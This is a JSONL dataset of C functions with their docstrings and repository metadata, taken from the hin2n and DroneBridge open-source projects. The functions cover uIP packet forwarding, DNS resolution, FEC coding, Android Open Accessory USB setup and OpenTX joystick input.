{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * \\internal\n * Find a network interface for the IP packet in uip_buf.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "static struct uip_fw_netif *\nfind_netif(void)", "code": "{\n  struct uip_fw_netif *netif;\n  \n  /* Walk through every network interface to check for a match. */\n  for(netif = netifs; netif != NULL; netif = netif->next) {\n    if(ipaddr_maskcmp(BUF->destipaddr, netif->ipaddr,\n\t\t      netif->netmask)) {\n      /* If there was a match, we break the loop. */\n      return netif;\n    }\n  }\n  \n  /* If no matching netif was found, we use default netif. */\n  return defaultnetif;\n}", "path": "hin2n/bundles/uip/uip/uip-fw.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*---------------------------------------------------------------------------*/\n/**\n * Obtain the currently configured DNS server.\n *\n * \\return A pointer to a 4-byte representation of the IP address of\n * the currently configured DNS server or NULL if no DNS server has\n * been configured.\n */\n/*---------------------------------------------------------------------------*/\n", "func_signal": "u16_t *\nresolv_getserver(void)", "code": "{\n  if(resolv_conn == NULL) {\n    return NULL;\n  }\n  return resolv_conn->ripaddr;\n}", "path": "hin2n/bundles/uip/apps/resolv/resolv.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * Perform periodic processing.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "void\nuip_fw_periodic(void)", "code": "{\n  struct fwcache_entry *fw;\n  for(fw = fwcache; fw < &fwcache[FWCACHE_SIZE]; ++fw) {\n    if(fw->timer > 0) {\n      --fw->timer;\n    }\n  }\n}", "path": "hin2n/bundles/uip/uip/uip-fw.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * Initialize the uIP packet forwarding module.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "void\nuip_fw_init(void)", "code": "{\n  struct uip_fw_netif *t;\n  defaultnetif = NULL;\n  while(netifs != NULL) {\n    t = netifs;\n    netifs = netifs->next;\n    t->next = NULL;\n  }\n}", "path": "hin2n/bundles/uip/uip/uip-fw.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*---------------------------------------------------------------------------*/\n/** \\internal\n * The main UDP function.\n */\n/*---------------------------------------------------------------------------*/\n", "func_signal": "void\nresolv_appcall(void)", "code": "{\n  if(uip_udp_conn->rport == HTONS(53)) {\n    if(uip_poll()) {\n      check_entries();\n    }\n    if(uip_newdata()) {\n      newdata();\n    }\n  }\n}", "path": "hin2n/bundles/uip/apps/resolv/resolv.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/* UIP_ARCH_CHKSUM */\n/*---------------------------------------------------------------------------*/\n", "func_signal": "void\nuip_init(void)", "code": "{\n  for(c = 0; c < UIP_LISTENPORTS; ++c) {\n    uip_listenports[c] = 0;\n  }\n  for(c = 0; c < UIP_CONNS; ++c) {\n    uip_conns[c].tcpstateflags = UIP_CLOSED;\n  }\n#if UIP_ACTIVE_OPEN\n  lastport = 1024;\n#endif /* UIP_ACTIVE_OPEN */\n\n#if UIP_UDP\n  for(c = 0; c < UIP_UDP_CONNS; ++c) {\n    uip_udp_conns[c].lport = 0;\n  }\n#endif /* UIP_UDP */\n  \n\n  /* IPv4 initialization. */\n#if UIP_FIXEDADDR == 0\n  /*  uip_hostaddr[0] = uip_hostaddr[1] = 0;*/\n#endif /* UIP_FIXEDADDR */\n\n}", "path": "hin2n/bundles/uip/uip/uip.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/** Find the address and IP mode for the tuntap device.\n *\n *  s is one of these forms:\n *\n *  <host> := <hostname> | A.B.C.D\n *\n *  <host> | static:<host> | dhcp:<host>\n *\n *  If the mode is present (colon required) then fill ip_mode with that value\n *  otherwise do not change ip_mode. Fill ip_mode with everything after the\n *  colon if it is present; or s if colon is not present.\n *\n *  ip_add and ip_mode are NULL terminated if modified.\n *\n *  return 0 on success and -1 on error\n */\n", "func_signal": "static int scan_address(char * ip_addr, size_t addr_size,\n                        char * ip_mode, size_t mode_size,\n                        const char * s)", "code": "{\n  int retval = -1;\n  char * p;\n\n  if((NULL == s) || (NULL == ip_addr))\n    {\n      return -1;\n    }\n\n  memset(ip_addr, 0, addr_size);\n\n  p = strpbrk(s, \":\");\n\n  if(p)\n    {\n      /* colon is present */\n      if(ip_mode)\n        {\n\t  size_t end=0;\n\n\t  memset(ip_mode, 0, mode_size);\n\t  end = MIN(p-s, (ssize_t)(mode_size-1)); /* ensure NULL term */\n\t  strncpy(ip_mode, s, end);\n\t  strncpy(ip_addr, p+1, addr_size-1); /* ensure NULL term */\n\t  retval = 0;\n        }\n    }\n  else\n    {\n      /* colon is not present */\n      strncpy(ip_addr, s, addr_size);\n    }\n\n  return retval;\n}", "path": "hin2n/Hin2n_android/app/src/main/cpp/edge_jni/edge_android_v2.c", "commit_date": "2020-12-07 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * Forward an IP packet in the uip_buf buffer.\n *\n *\n *\n * \\return UIP_FW_FORWARDED if the packet was forwarded, UIP_FW_LOCAL if\n * the packet should be processed locally.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "u8_t\nuip_fw_forward(void)", "code": "{\n  struct fwcache_entry *fw;\n\n  /* First check if the packet is destined for ourselves and return 0\n     to indicate that the packet should be processed locally. */\n  if(BUF->destipaddr[0] == uip_hostaddr[0] &&\n     BUF->destipaddr[1] == uip_hostaddr[1]) {\n    return UIP_FW_LOCAL;\n  }\n\n  /* If we use ping IP address configuration, and our IP address is\n     not yet configured, we should intercept all ICMP echo packets. */\n#if UIP_PINGADDRCONF\n  if((uip_hostaddr[0] | uip_hostaddr[1]) == 0 &&\n     BUF->proto == UIP_PROTO_ICMP &&\n     ICMPBUF->type == ICMP_ECHO) {\n    return UIP_FW_LOCAL;\n  }\n#endif /* UIP_PINGADDRCONF */\n\n  /* Check if the packet is in the forwarding cache already, and if so\n     we drop it. */\n\n  for(fw = fwcache; fw < &fwcache[FWCACHE_SIZE]; ++fw) {\n    if(fw->timer != 0 &&\n#if UIP_REASSEMBLY > 0\n       fw->len == BUF->len &&\n       fw->offset == BUF->ipoffset &&\n#endif\n       fw->ipid == BUF->ipid &&\n       fw->srcipaddr[0] == BUF->srcipaddr[0] &&\n       fw->srcipaddr[1] == BUF->srcipaddr[1] &&\n       fw->destipaddr[0] == BUF->destipaddr[0] &&\n       fw->destipaddr[1] == BUF->destipaddr[1] &&\n#if notdef\n       fw->payload[0] == BUF->srcport &&\n       fw->payload[1] == BUF->destport &&\n#endif\n       fw->proto == BUF->proto) {\n      /* Drop packet. */\n      return UIP_FW_FORWARDED;\n    }\n  }\n\n  /* If the TTL reaches zero we produce an ICMP time exceeded message\n     in the uip_buf buffer and forward that packet back to the sender\n     of the packet. */\n  if(BUF->ttl <= 1) {\n    /* No time exceeded for broadcasts and multicasts! */\n    if(BUF->destipaddr[0] == 0xffff && BUF->destipaddr[1] == 0xffff) {\n      return UIP_FW_LOCAL;\n    }\n    time_exceeded();\n  }\n  \n  /* Decrement the TTL (time-to-live) value in the IP header */\n  BUF->ttl = BUF->ttl - 1;\n  \n  /* Update the IP checksum. */\n  if(BUF->ipchksum >= HTONS(0xffff - 0x0100)) {\n    BUF->ipchksum = BUF->ipchksum + HTONS(0x0100) + 1;\n  } else {\n    BUF->ipchksum = BUF->ipchksum + HTONS(0x0100);\n  }\n\n  if(uip_len > 0) {\n    uip_appdata = &uip_buf[UIP_LLH_LEN + UIP_TCPIP_HLEN];\n    uip_fw_output();\n  }\n\n#if UIP_BROADCAST\n  if(BUF->destipaddr[0] == 0xffff && BUF->destipaddr[1] == 0xffff) {\n    return UIP_FW_LOCAL;\n  }\n#endif /* UIP_BROADCAST */\n\n  /* Return non-zero to indicate that the packet was forwarded and that no\n     other processing should be made. */\n  return UIP_FW_FORWARDED;\n}", "path": "hin2n/bundles/uip/uip/uip-fw.c", "commit_date": "2018-04-16 00:00:00", "repo_name": "switch-iot/hin2n", "stars": 531, "license": "gpl-3.0", "language": "c", "size": 10468}
{"docstring": "/**\n * Decode data applying FEC\n * @param blockSize Size of packets\n * @param data_blocks pointer to list of data packets\n * @param nr_data_blocks number of data packets\n * @param fec_blocks pointer to list of FEC packets\n * @param fec_block_nos Indices of FEC packets that shall repair erased data packets in data packet list [array]\n * @param erased_blocks Indices of erased data packets in FEC packet data list [array]\n * @param nr_fec_blocks Number of FEC blocks used to repair data packets\n */\n", "func_signal": "void fec_decode(int blockSize,\n                unsigned char **data_blocks,\n                unsigned int nr_data_blocks,\n                unsigned char **fec_blocks,\n                unsigned int *fec_block_nos,\n                unsigned int *erased_blocks,\n                unsigned short nr_fec_blocks)", "code": "{\n#ifdef PROFILE\n    long long begin;\n    long long end;\n#endif\n\n#ifdef PROFILE\n    begin = rdtsc();\n#endif\n    reduce(blockSize, data_blocks, nr_data_blocks,\n           fec_blocks, fec_block_nos, erased_blocks, nr_fec_blocks);\n#ifdef PROFILE\n    end = rdtsc();\n    reduceTime += end - begin;\n    begin = end;\n#endif\n    resolve(blockSize, data_blocks,\n            fec_blocks, fec_block_nos, erased_blocks,\n            nr_fec_blocks);\n#ifdef PROFILE\n    end = rdtsc();\n    resolveTime += end - begin;\n#endif\n}", "path": "DroneBridge/video/fec.c", "commit_date": "2020-09-06 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/**\n * Checks if specified device supports android open accessory protocol\n * @param usb_dev\n * @param db_acc\n * @return\n */\n", "func_signal": "int supports_aoa(libusb_device *usb_dev, db_accessory_t *db_acc)", "code": "{\n    uint8_t buffer[2];\n    libusb_device_handle *dev_handle;\n\n    int ret = libusb_open(usb_dev, &dev_handle);\n    if (ret != 0 || dev_handle == NULL) {\n        return 0;\n    }\n\n    // Now asking if device supports Android Open Accessory protocol\n    ret = libusb_control_transfer(dev_handle, LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_VENDOR, AOA_GET_PROTOCOL,\n                                  0, 0, buffer, sizeof(buffer), 2000);\n    if (ret == 0) {\n        LOG_SYS_STD(LOG_ERR, \"AOA_USB: ERROR - Could not get protocol: %s\\n\", libusb_error_name(ret));\n        libusb_close(db_acc->handle);\n        return 0;\n    } else {\n        uint32_t version_num = ((buffer[1] << 8) | buffer[0]);\n        if (version_num <= 2 && version_num > 0) {\n            db_acc->aoa_version = version_num;\n            db_acc->handle = dev_handle;\n            LOG_SYS_STD(LOG_INFO, \"AOA_USB: Found device that supports AOA %d.0!\\n\", db_acc->aoa_version);\n            usleep(10000);\n            return 1;\n        } else {\n            libusb_close(db_acc->handle);\n            return 0;\n        }\n    }\n}", "path": "DroneBridge/usbbridge/linux_aoa.c", "commit_date": "2020-07-26 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/**\n * Reduce the system by substracting all received data blocks from FEC blocks\n * This will allow to resolve the system by inverting a much smaller matrix\n * (with size being number of blocks lost, rather than number of data blocks\n * + fec)\n */\n", "func_signal": "static inline void reduce(int blockSize,\n                          unsigned char **data_blocks,\n                          unsigned int nr_data_blocks,\n                          unsigned char **fec_blocks,\n                          unsigned int *fec_block_nos,\n                          unsigned int *erased_blocks,\n                          unsigned short nr_fec_blocks)", "code": "{\n    int erasedIdx = 0;\n    unsigned int col;\n\n    /* First we reduce the code vector by substracting all known elements\n     * (non-erased data packets) */\n    for (col = 0; col < nr_data_blocks; col++) {\n        if (erasedIdx < nr_fec_blocks && erased_blocks[erasedIdx] == col) {\n            erasedIdx++;\n        } else {\n            unsigned char *src = data_blocks[col];\n            int j;\n            for (j = 0; j < nr_fec_blocks; j++) {\n                unsigned int blno = fec_block_nos[j];\n                gf256_muladd_mem(fec_blocks[j], inverse[blno ^ col ^ 128], src, blockSize);\n            }\n        }\n    }\n\n    assert(nr_fec_blocks == erasedIdx);\n}", "path": "DroneBridge/video/fec.c", "commit_date": "2020-09-06 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/* We do the matrix multiplication columns by column, instead of the\n * usual row-by-row, in order to capitalize on the cache freshness of\n * each data block . The data block only needs to be fetched once, and\n * can be used to be addmull'ed into all FEC blocks at once. No need\n * to worry about evicting FEC blocks from the cache: those are so\n * few (typically, 4 or 8) that they will fit easily in the cache (even\n * in the L2 cache...)\n */\n", "func_signal": "void fec_encode_old(unsigned int blockSize,\n                unsigned char **data_blocks,\n                unsigned int nrDataBlocks,\n                unsigned char **fec_blocks,\n                unsigned int nrFecBlocks)", "code": "{\n    unsigned int blockNo; /* loop for block counter */\n    unsigned int row, col;\n\n    assert(fec_initialized);\n    assert(nrDataBlocks <= 128);\n    assert(nrFecBlocks <= 128);\n\n    if (!nrDataBlocks)\n        return;\n\n    for (row = 0; row < nrFecBlocks; row++)\n        mul(fec_blocks[row], data_blocks[0], inverse[128 ^ row], blockSize);\n\n    for (col = 129, blockNo = 1; blockNo < nrDataBlocks; col++, blockNo++) {\n        for (row = 0; row < nrFecBlocks; row++)\n            addmul(fec_blocks[row], data_blocks[blockNo],\n                   inverse[row ^ col],\n                   blockSize);\n    }\n}", "path": "DroneBridge/video/fec_old.c", "commit_date": "2020-09-06 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/**\n * Init function for all USB communication\n * Blocking call.\n * Searches for usb devices in android accessory mode and opens them.\n * In case of no open device it will try to find a supported device (android phone) amongst the connected USB devices &\n * put the device into android accessory mode\n * @param db_acc\n * @return -1 on kill or failure, 1 on already connected\n */\n", "func_signal": "int init_db_accessory(db_accessory_t *db_acc)", "code": "{\n    struct sigaction action;\n    memset(&action, 0, sizeof(struct sigaction));\n    memset(db_acc, 0, sizeof(db_accessory_t));\n    action.sa_handler = signal_callback;\n    sigaction(SIGTERM, &action, NULL);\n    sigaction(SIGINT, &action, NULL);\n\n    int ret = libusb_init(NULL);\n    if (ret != 0) {\n        LOG_SYS_STD(LOG_ERR, \"AOA_USB: ERROR - Could not init libusb: %d\\n\", ret);\n        return -1;\n    }\n\n    if (connect_to_device_in_accessory_mode(db_acc) < 1) {\n        // No device in accessory mode connected. Search\n        while (!abort_aoa_init) {\n            usleep(1000000);\n            int found_dev = discover_compatible_devices(db_acc);\n            if (found_dev) {\n                if (abort_aoa_init) return -1;\n                LOG_SYS_STD(LOG_INFO, \"AOA_USB:\\tSending manufacturer identification: %s\\n\", DB_AOA_MANUFACTURER);\n                if (libusb_control_transfer(db_acc->handle, LIBUSB_ENDPOINT_OUT | LIBUSB_REQUEST_TYPE_VENDOR,\n                                            AOA_SEND_IDENT, 0,\n                                            AOA_STRING_MAN_ID, (uint8_t *) DB_AOA_MANUFACTURER,\n                                            strlen(DB_AOA_MANUFACTURER) + 1,\n                                            0) < 0) {\n                    LOG_SYS_STD(LOG_ERR,\n                            \"\\x1B[31m\" \"--> Error sending manufacturer information to android device \\x1B[0m \\n\");\n                    continue;\n                }\n                usleep(10000);\n                LOG_SYS_STD(LOG_INFO, \"AOA_USB:\\tSending model identification: %s\\n\", DB_AOA_MODEL_NAME);\n                if (libusb_control_transfer(db_acc->handle, LIBUSB_ENDPOINT_OUT | LIBUSB_REQUEST_TYPE_VENDOR,\n                                            AOA_SEND_IDENT, 0,\n                                            AOA_STRING_MOD_ID, (uint8_t *) DB_AOA_MODEL_NAME,\n                                            strlen(DB_AOA_MODEL_NAME) + 1,\n                                            0) < 0) {\n                    LOG_SYS_STD(LOG_ERR,\n                            \"\\x1B[31m\" \"AOA_USB: ERROR - sending model information to android device \\x1B[0m \\n\");\n                    continue;\n                }\n                usleep(10000);\n                LOG_SYS_STD(LOG_INFO, \"AOA_USB:\\tSending description: %s\\n\", DB_AOA_DESC);\n                if (libusb_control_transfer(db_acc->handle, LIBUSB_ENDPOINT_OUT | LIBUSB_REQUEST_TYPE_VENDOR,\n                                            AOA_SEND_IDENT, 0,\n                                            AOA_STRING_DSC_ID, (uint8_t *) DB_AOA_DESC, strlen(DB_AOA_DESC) + 1, 0) < 0) {\n                    LOG_SYS_STD(LOG_ERR, \"\\x1B[31m\" \"--> Error sending URL information to android device \\x1B[0m \\n\");\n                    continue;\n                }\n                usleep(10000);\n                LOG_SYS_STD(LOG_INFO, \"AOA_USB:\\tSending version information: %s\\n\", DB_AOA_VERSION);\n                if (libusb_control_transfer(db_acc->handle, LIBUSB_ENDPOINT_OUT | LIBUSB_REQUEST_TYPE_VENDOR,\n                                            AOA_SEND_IDENT, 0,\n                                            AOA_STRING_VER_ID, (uint8_t *) DB_AOA_VERSION, strlen(DB_AOA_VERSION) + 1,\n                                            0) < 0) {\n                    LOG_SYS_STD(LOG_ERR, \"\\x1B[31m\" \"--> Error sending URL information to android device \\x1B[0m \\n\");\n                    continue;\n                }\n                usleep(10000);\n                LOG_SYS_STD(LOG_INFO, \"AOA_USB:\\tSending URL identification: %s\\n\", DB_AOA_URL);\n                if (libusb_control_transfer(db_acc->handle, LIBUSB_ENDPOINT_OUT | LIBUSB_REQUEST_TYPE_VENDOR,\n                                            AOA_SEND_IDENT, 0,\n                                            AOA_STRING_URL_ID, (uint8_t *) DB_AOA_URL, strlen(DB_AOA_URL) + 1, 0) < 0) {\n                    LOG_SYS_STD(LOG_ERR, \"\\x1B[31m\" \"--> Error sending URL information to android device \\x1B[0m \\n\");\n                    continue;\n                }\n                usleep(10000);\n                LOG_SYS_STD(LOG_INFO, \"AOA_USB:\\tSending serial number: %s\\n\", DB_AOA_VERSION);\n                if (libusb_control_transfer(db_acc->handle, LIBUSB_ENDPOINT_OUT | LIBUSB_REQUEST_TYPE_VENDOR,\n                                            AOA_SEND_IDENT, 0,\n                                            AOA_STRING_SER_ID, (uint8_t *) DB_AOA_SER, strlen(DB_AOA_SER) + 1, 0) < 0) {\n                    LOG_SYS_STD(LOG_ERR, \"\\x1B[31m\" \"--> Error sending URL information to android device \\x1B[0m \\n\");\n                    continue;\n                }\n                usleep(10000);\n\n                LOG_SYS_STD(LOG_INFO, \"AOA_USB: Enabling accessory mode on device\\n\");\n                if (libusb_control_transfer(db_acc->handle, LIBUSB_ENDPOINT_OUT | LIBUSB_REQUEST_TYPE_VENDOR,\n                                            AOA_START_ACCESSORY,\n                                            0, 0, NULL, 0, 0) < 0) {\n                    LOG_SYS_STD(LOG_ERR, \"\\x1B[31m\" \"--> Error enabling accessory mode on device\" \"\\x1B[0m\" \"\\n\");\n                    continue;\n                }\n                usleep(10000);\n//                if (db_acc->handle != NULL) {\n//                    int rett;\n//                    if ((rett = libusb_release_interface(db_acc->handle, 0)) < 0)\n//                        LOG_SYS_STD(LOG_ERR, \"AOA_USB: Error releasing interface %s\\n\", libusb_error_name(rett));\n//                }\n                libusb_close(db_acc->handle);\n\n                usleep(100000);\n                // Connect to accessory\n                int tries = 10;\n                while (tries--) {\n                    if (connect_to_device_in_accessory_mode(db_acc) > 0)\n                        return 1;  // success init\n                    else if (!tries)\n                        return -1;  // finally failed init\n                    else\n                        usleep(2000000);  // retry opening connection\n                }\n            }\n        }\n    } else {\n        return 1;\n    }\n    return -1;\n}", "path": "DroneBridge/usbbridge/linux_aoa.c", "commit_date": "2020-07-26 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/* 1, 4, 8, 16 */\n", "func_signal": "void slow_addmul1(gf *dst1, gf *src1, gf c, int sz)", "code": "{\n    USE_GF_MULC;\n    register gf *dst = dst1, *src = src1;\n    gf *lim = &dst[sz - UNROLL + 1];\n\n    GF_MULC0(c);\n\n#if (UNROLL > 1) /* unrolling by 8/16 is quite effective on the pentium */\n    for (; dst < lim; dst += UNROLL, src += UNROLL) {\n        GF_ADDMULC(dst[0], src[0]);\n        GF_ADDMULC(dst[1], src[1]);\n        GF_ADDMULC(dst[2], src[2]);\n        GF_ADDMULC(dst[3], src[3]);\n#if (UNROLL > 4)\n        GF_ADDMULC(dst[4], src[4]);\n        GF_ADDMULC(dst[5], src[5]);\n        GF_ADDMULC(dst[6], src[6]);\n        GF_ADDMULC(dst[7], src[7]);\n#endif\n#if (UNROLL > 8)\n        GF_ADDMULC(dst[8], src[8]);\n        GF_ADDMULC(dst[9], src[9]);\n        GF_ADDMULC(dst[10], src[10]);\n        GF_ADDMULC(dst[11], src[11]);\n        GF_ADDMULC(dst[12], src[12]);\n        GF_ADDMULC(dst[13], src[13]);\n        GF_ADDMULC(dst[14], src[14]);\n        GF_ADDMULC(dst[15], src[15]);\n#endif\n    }\n#endif\n    lim += UNROLL - 1;\n    for (; dst < lim; dst++, src++)        /* final components */\n        GF_ADDMULC(*dst, *src);\n}", "path": "DroneBridge/video/fec_old.c", "commit_date": "2020-09-06 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/**\n * Read and send RC commands using a OpenTX based radio\n *\n * @param Joy_IF Joystick interface as specified by jscal interface index of the OpenTX based radio connected via USB\n * @param frequency_sleep Time to sleep between every RC value read & send\n */\n", "func_signal": "void opentx(int Joy_IF, struct timespec frequency_sleep)", "code": "{\n    signal(SIGINT, custom_signal_handler);\n    struct js_event e;\n    uint16_t joystickData[NUM_CHANNELS];\n    struct timespec tim_remain;\n    int16_t opentx_channels[32] = {0};\n\n    int fd = initialize_opentx(Joy_IF);\n    LOG_SYS_STD(LOG_INFO, \"DB_CONTROL_GND: DroneBridge OpenTX - starting!\\n\");\n    while (keep_running) //send loop\n    {\n        nanosleep(&frequency_sleep, &tim_remain);\n        while (read(fd, &e, sizeof(e)) > 0)   // go through all events occurred\n        {\n            e.type &= ~JS_EVENT_INIT; /* ignore synthetic events */\n            if (e.type == JS_EVENT_AXIS) {\n                opentx_channels[e.number] = e.value;\n            } else if (e.type == JS_EVENT_BUTTON) {\n                opentx_channels[8 + e.number] = e.value;\n            }\n        }\n\n        int myerror = errno;\n        if (myerror != EAGAIN) {\n            if (myerror == ENODEV) {\n                LOG_SYS_STD(LOG_WARNING, \"DB_CONTROL_GND: Joystick was unplugged! Retrying...\\n\");\n                fd = initialize_opentx(Joy_IF);\n            } else {\n                LOG_SYS_STD(LOG_ERR, \"DB_CONTROL_GND: Error: %s\\n\", strerror(myerror));\n            }\n        }\n        // Channel map must be AETR1234!\n        joystickData[0] = normalize_opentx(opentx_channels[0]);\n        joystickData[1] = normalize_opentx(opentx_channels[1]);\n        joystickData[2] = normalize_opentx(opentx_channels[2]);\n        joystickData[3] = normalize_opentx(opentx_channels[3]);\n        joystickData[4] = normalize_opentx(opentx_channels[4]);\n        joystickData[5] = normalize_opentx(opentx_channels[5]);\n        joystickData[6] = normalize_opentx(opentx_channels[6]);\n        joystickData[7] = normalize_opentx(opentx_channels[7]);\n        if (opentx_channels[8] == 1) joystickData[8] = (uint16_t) 1000; else joystickData[8] = (uint16_t) 2000;\n        if (opentx_channels[9] == 1) joystickData[9] = (uint16_t) 1000; else joystickData[9] = (uint16_t) 2000;\n        if (opentx_channels[10] == 1) joystickData[10] = (uint16_t) 1000; else joystickData[10] = (uint16_t) 2000;\n        if (opentx_channels[11] == 1) joystickData[11] = (uint16_t) 1000; else joystickData[11] = (uint16_t) 2000;\n        if (opentx_channels[12] == 1)\n            joystickData[12] = (uint16_t) 1000;\n        else joystickData[12] = (uint16_t) 2000; // not sent via DB RC proto\n        if (opentx_channels[13] == 1)\n            joystickData[13] = (uint16_t) 1000;\n        else joystickData[13] = (uint16_t) 2000; // not sent via DB RC proto\n        send_rc_packet(joystickData);\n    }\n    close(fd);\n    close_raw_interfaces();\n}", "path": "DroneBridge/control/opentx.c", "commit_date": "2019-09-12 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/*\n * initialize the data structures used for computations in GF.\n */\n", "func_signal": "static void generate_gf(void)", "code": "{\n    int i;\n    gf mask;\n    char *Pp = allPp[GF_BITS];\n\n    mask = 1;    /* x ** 0 = 1 */\n    gf_exp[GF_BITS] = 0; /* will be updated at the end of the 1st loop */\n    /*\n     * first, generate the (polynomial representation of) powers of \\alpha,\n     * which are stored in gf_exp[i] = \\alpha ** i .\n     * At the same time build gf_log[gf_exp[i]] = i .\n     * The first GF_BITS powers are simply bits shifted to the left.\n     */\n    for (i = 0; i < GF_BITS; i++, mask <<= 1) {\n        gf_exp[i] = mask;\n        gf_log[gf_exp[i]] = i;\n        /*\n         * If Pp[i] == 1 then \\alpha ** i occurs in poly-repr\n         * gf_exp[GF_BITS] = \\alpha ** GF_BITS\n         */\n        if (Pp[i] == '1')\n            gf_exp[GF_BITS] ^= mask;\n    }\n    /*\n     * now gf_exp[GF_BITS] = \\alpha ** GF_BITS is complete, so can als\n     * compute its inverse.\n     */\n    gf_log[gf_exp[GF_BITS]] = GF_BITS;\n    /*\n     * Poly-repr of \\alpha ** (i+1) is given by poly-repr of\n     * \\alpha ** i shifted left one-bit and accounting for any\n     * \\alpha ** GF_BITS term that may occur when poly-repr of\n     * \\alpha ** i is shifted.\n     */\n    mask = 1 << (GF_BITS - 1);\n    for (i = GF_BITS + 1; i < GF_SIZE; i++) {\n        if (gf_exp[i - 1] >= mask)\n            gf_exp[i] = gf_exp[GF_BITS] ^ ((gf_exp[i - 1] ^ mask) << 1);\n        else\n            gf_exp[i] = gf_exp[i - 1] << 1;\n        gf_log[gf_exp[i]] = i;\n    }\n    /*\n     * log(0) is not defined, so use a special value\n     */\n    gf_log[0] = GF_SIZE;\n    /* set the extended gf_exp values for fast multiply */\n    for (i = 0; i < GF_SIZE; i++)\n        gf_exp[i + GF_SIZE] = gf_exp[i];\n\n    /*\n     * again special cases. 0 has no inverse. This used to\n     * be initialized to GF_SIZE, but it should make no difference\n     * since noone is supposed to read from here.\n     */\n    inverse[0] = 0;\n    inverse[1] = 1;\n    for (i = 2; i <= GF_SIZE; i++)\n        inverse[i] = gf_exp[GF_SIZE - gf_log[i]];\n}", "path": "DroneBridge/video/fec.c", "commit_date": "2020-09-06 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/**\n * Searches for a connected device in android accessory mode and opens a connection\n * @param accessory\n * @return 1 on success, 0 on failure\n */\n", "func_signal": "int connect_to_device_in_accessory_mode(db_accessory_t *accessory)", "code": "{\n    // check for already present accessories\n    libusb_device **device_list;\n    ssize_t cnt = libusb_get_device_list(NULL, &device_list);\n\n    for (ssize_t i = 0; i < cnt; i++) {\n        libusb_device *device = device_list[i];\n        if (is_accessory_device(device, accessory)) {\n            int ret = libusb_open(device, &accessory->handle);\n            if (ret != 0 || accessory->handle == NULL) {\n                LOG_SYS_STD(LOG_ERR, \"AOA_USB: ERROR - Unable to open connected device in android accessory mode: %s\\n\",\n                        libusb_error_name(ret));\n                libusb_free_device_list(device_list, 1);\n                return -1;\n            }\n            LOG_SYS_STD(LOG_INFO, \"AOA_USB: Detected device in accessory mode: %4.4x:%4.4x\\n\", AOA_ACCESSORY_VID,\n                        accessory->pid);\n\n//            if ((ret = libusb_set_configuration(accessory->handle, 0)) != 0)\n//                LOG_SYS_STD(LOG_ERR, \"--> Error setting device configuration %s\\n\", libusb_error_name(ret));\n\n            struct libusb_config_descriptor *config_descriptor;\n            ret = libusb_get_active_config_descriptor(device, &config_descriptor);\n            if (ret != 0)\n                LOG_SYS_STD(LOG_ERR, \"AOA_USB: ERROR - getting active config desc. %s\\n\", libusb_error_name(ret));\n            LOG_SYS_STD(LOG_INFO, \"AOA_USB:\\tGot %i interfaces\\n\", config_descriptor->bNumInterfaces);\n            db_usb_max_packet_size =\n                    config_descriptor->interface[0].altsetting->endpoint[0].wMaxPacketSize - DB_AOA_HEADER_LENGTH - 1;\n            LOG_SYS_STD(LOG_INFO, \"AOA_USB:\\tMax packet size is %i bytes\\n\", db_usb_max_packet_size);\n\n            ret = libusb_claim_interface(accessory->handle, 0);\n            if (ret != 0)\n                LOG_SYS_STD(LOG_ERR, \"AOA_USB: ERROR - claiming AOA interface: %s\\n\", libusb_error_name(ret));\n\n            libusb_free_config_descriptor(config_descriptor);\n            libusb_free_device_list(device_list, 1);\n            return 1;\n        }\n    }\n    libusb_free_device_list(device_list, 1);\n    LOG_SYS_STD(LOG_INFO, \"AOA_USB: No device in accessory mode found\\n\");\n    return 0;\n}", "path": "DroneBridge/usbbridge/linux_aoa.c", "commit_date": "2020-07-26 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
